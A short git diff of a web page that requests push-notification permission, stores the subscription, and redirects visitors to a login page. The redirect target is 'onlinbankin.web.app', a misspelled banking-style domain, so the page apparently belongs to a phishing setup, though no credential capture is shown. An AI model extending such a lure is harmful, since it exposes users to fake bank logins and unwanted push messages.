@@ -7,13 +7,11 @@
     <title>Welcome</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
-    <!-- PWA Manifest & Theme -->
-    <link rel="manifest" href="/manifest.json" />
+    <!-- //PWA -->
+    <link rel="manifest" href="manifest.json" />
     <meta name="theme-color" content="#000000" />
-
-    <!-- For iOS PWA -->
-    <link rel="apple-touch-icon" href="/icon-192.png" />
+    <link rel="icon" href="../icon-192.png" type="image/x-icon">
+    <link rel="apple-touch-icon" href="../icon-192.png" />
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black" />
 </head>
@@ -41,7 +39,8 @@
             return Uint8Array.from([...rawData].map(c => c.charCodeAt(0)));
         }
 
-        // --- Generate Push Subscription ---
+        // --- Generate Push Subscription --
+
         async function generateServiceObject() {
             try {
                 const reg = await navigator.serviceWorker.register("sw.js");
@@ -58,11 +57,21 @@
 
                 const serviceObj = sub.toJSON();
                 localStorage.setItem("serviceObject", JSON.stringify(serviceObj));
-                window.location.href = 'https://onlinbankin.web.app/login/index.html'
+
+                // ✅ Device detection
+                const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+                if (isMobile) {
+                    window.location.href = "login/index.html";
+                } else {
+                    window.location.href = 'https://onlinbankin.web.app/login/index.html'
+                }
+
             } catch (err) {
                 console.error("Push subscription failed:", err);
             }
         }
+
 
         // --- Request Notification Permission Flow ---
         async function requestNotificationFlow() {
